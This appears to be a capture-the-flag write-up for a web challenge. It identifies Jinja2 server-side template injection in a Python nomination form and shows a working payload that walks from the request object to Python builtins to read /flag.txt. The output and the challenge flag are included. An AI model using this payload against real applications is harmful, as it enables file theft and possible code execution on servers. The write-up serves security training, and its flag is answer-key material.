## Solution

Application let's us _Nominate A Cyber Heroine_. 2 things quickly came to my mind: 1. SSTI and 2. Python Application.

[Wappalyzer](https://www.wappalyzer.com) confirms that application runs on Python, SSTI is confirmed by using {% raw %} `{{config}}` {% endraw %} (Jinja2 syntax)

Time to visit good old HackTricks: <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti>

Using RCE file read payload let's try to read flag file.

{% raw %}
`{{ request.__class__._load_form_data.__globals__.__builtins__.open("/flag.txt").read()  }}`
{% endraw %}

`Nomination received for: Test with bio:chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}`

> Flag: chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}
